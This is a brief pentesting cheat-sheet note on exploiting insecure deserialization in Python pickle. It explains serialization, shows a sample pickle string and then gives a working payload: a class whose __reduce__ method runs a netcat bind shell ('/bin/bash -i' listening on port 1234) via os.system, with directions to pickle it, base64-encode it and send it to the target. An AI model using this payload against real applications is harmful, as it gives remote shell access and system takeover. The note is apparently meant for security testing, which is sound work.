## Theory

Used by application to make their storage easier. If an application needs to store and instance of a class, it can use serialization to get a string representation of this object. When the application needs to use the instance, it will unserialise the string to get it.

## Pickle (python)

After decoding, if you have sthing like this, you are dealing with serialisation : 

```
(i__main__
Hack
(dp1
S'test1'
p2
S'test'
p3
sS'test2'
p4
S'retest'
p5
sb.
```

Encode your payload :

```
class Test(object):
  def __reduce__(self):
    return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
	
serial = Test()
print pickle.dumps(serial)
```

Use python2 or python3 
Encode it with base64 if needed and use it.

